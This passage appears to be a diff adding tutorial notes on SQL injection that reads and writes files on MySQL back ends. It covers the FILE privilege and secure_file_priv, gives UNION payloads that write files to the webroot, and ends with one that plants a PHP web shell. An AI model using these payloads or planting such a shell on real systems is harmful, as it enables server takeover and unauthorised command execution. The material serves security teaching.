@@ -295,3 +295,68 @@ cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 
 If the code is rendered on the page, we can use the developers tool of browser in order to read it.
 
+
+# Writing files
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+1. User with FILE privilege enabled
+2. MySQL global secure_file_priv variable not enabled
+3. Write access to the location we want to write to on the back-end server
+
+### secure_file_priv
+
+The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder.
+
+So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables **are stored in a table called global_variables**, and as per the documentation, this table has two columns variable_name and variable_value.
+We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
+
+The final SQL query is the following:
+```sql
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+```
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+### SELECT INTO OUTFILE
+
+The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+
+### Writing Files through SQL Injection
+
+Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully to the /var/www/html/proof.txt file, which we can then access on the web application:
+```sql
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+```
+
+The UNION injection payload would be as follows:
+```sql
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+### Writing a web shell
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL.
